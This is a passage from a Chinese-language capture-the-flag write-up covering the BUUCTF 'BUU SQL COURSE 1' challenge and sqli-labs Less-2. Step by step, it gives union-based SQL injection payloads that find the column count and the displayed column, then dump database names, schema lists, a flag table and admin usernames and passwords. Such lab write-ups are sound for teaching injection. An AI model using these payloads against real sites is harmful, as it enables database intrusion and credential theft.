...
![](/images/20260307105415.png)
最终我们锁定在sqli库的flag表里发现flag并提取数据id=-1 union select 1,group_concat(flag) from flag
![](/images/20260307105656.png)

# 5.BUUCTF  BUU SQL  COURSE  1
![](/images/20260307134221.png)
我们点击测试新闻1/2/3发现url栏里content/后面的数字在变化，我们猜测是数字型注入
![](/images/20260307134338.png)
![](/images/20260307134350.png)
![](/images/20260307134401.png)
我们猜字数段，在url栏输入1 order by 1/2/3
![](/images/20260307134827.png)![](/images/20260307134843.png)
![](/images/20260307134858.png)
说明字数段为2，接下来我们查显位，用到语句-1 union select 1,2
![](/images/20260307135123.png)
说明在2这个字段存在显示位，然后我们查库名-1 union select 1,database()
![](/images/20260307135512.png)
...
![](/images/20260307140656.png)
在admin表里面我们发现了，username和password字段，因此我们可以拿出里面的数据然后登录，-1 union select 1,group_concat(username,' ',password) from admin
![](/images/20260307141325.png)

输入用户名和密码
![](/images/20260307141357.png)

# 6.sqli-labs Less-2（数字型注入）

 # 废话少说来感受第二题
![](/images/20260307155457.png)
我们在URL栏里面输入?id=1/2
![](/images/20260307155742.png)![](/images/20260307155819.png)
说明与数字型有关，具体是不是数字型注入，我们继续验证?id=1 and 1=1/2![](/images/20260307155948.png)
![](/images/20260307160001.png)
当变成1=2时页面报错，所以为数字型注入
接下来我们要猜数字段?id=1 order by 1/2/3/4
![](/images/20260307160240.png)
![](/images/20260307160313.png)
当我们输入4的时候页面报错，说明数字段在3，所以我们要查显位?id=-1 union select 1,2 ,3
![](/images/20260307160556.png)
在3处有显示位（回显），接下来我们要查库名?id=-1 union select 1,database(),3 
![](/images/20260307161337.png)
我们在找到了一个叫security的库==（==?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata![](/images/20260307161459.png)==这是数据库里所有的库）==
